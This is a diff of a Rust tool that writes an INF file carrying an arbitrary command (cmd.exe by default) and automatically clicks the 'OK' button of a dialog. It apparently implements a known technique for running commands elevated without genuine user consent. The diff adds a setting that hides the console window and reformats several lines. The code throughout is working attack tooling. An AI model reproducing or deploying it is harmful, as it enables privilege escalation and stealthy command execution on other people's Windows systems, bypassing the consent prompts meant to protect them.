@@ -1,3 +1,4 @@
+#![windows_subsystem = "windows"]
 use std::env::args;
 use std::ffi::CString;
 use std::fs::File;
@@ -6,8 +7,11 @@ use std::process::{Command, Stdio};
 use std::ptr::null_mut;
 use std::thread;
 use std::time::Duration;
-use winapi::um::winuser::{FindWindowA, FindWindowExA, SendMessageA, SetForegroundWindow, ShowWindow, SW_SHOWNORMAL, BM_CLICK};
-use winapi::um::winuser::{INPUT, INPUT_KEYBOARD, KEYBDINPUT, SendInput, VK_RETURN};
+use winapi::um::winuser::{
+    FindWindowA, FindWindowExA, SendMessageA, SetForegroundWindow, ShowWindow, BM_CLICK,
+    SW_SHOWNORMAL,
+};
+use winapi::um::winuser::{SendInput, INPUT, INPUT_KEYBOARD, KEYBDINPUT, VK_RETURN};
 
 static INF_TEMPLATE: &str = r#"[version]
 Signature=$chicago$
@@ -38,7 +42,8 @@ fn generate_inf_file(command: &str) -> String {
     let inf_data = INF_TEMPLATE.replace("REPLACE_COMMAND_LINE", command);
 
     let mut file = File::create(&random_file_name).expect("Failed to create INF file");
-    file.write_all(inf_data.as_bytes()).expect("Failed to write INF file");
+    file.write_all(inf_data.as_bytes())
+        .expect("Failed to write INF file");
 
     random_file_name
 }
@@ -83,7 +88,12 @@ fn interact_with_window(process_name: &str) -> bool {
             SetForegroundWindow(hwnd);
             ShowWindow(hwnd, SW_SHOWNORMAL);
 
-            let ok_button = FindWindowExA(hwnd, null_mut(), null_mut(), CString::new("OK").unwrap().as_ptr());
+            let ok_button = FindWindowExA(
+                hwnd,
+                null_mut(),
+                null_mut(),
+                CString::new("OK").unwrap().as_ptr(),
+            );
             if !ok_button.is_null() {
                 SendMessageA(ok_button, BM_CLICK, 0, 0);
                 return true;
@@ -123,7 +133,9 @@ fn main() {
         let command_to_execute = "C:\\Windows\\System32\\cmd.exe";
         generate_inf_file(command_to_execute)
     } else if args.len() > 2 {
-        eprintln!("Either specify a single file to be executed, or leave blank for the default value");
+        eprintln!(
+            "Either specify a single file to be executed, or leave blank for the default value"
+        );
         return;
     } else {
         let command_to_execute = &args[1];
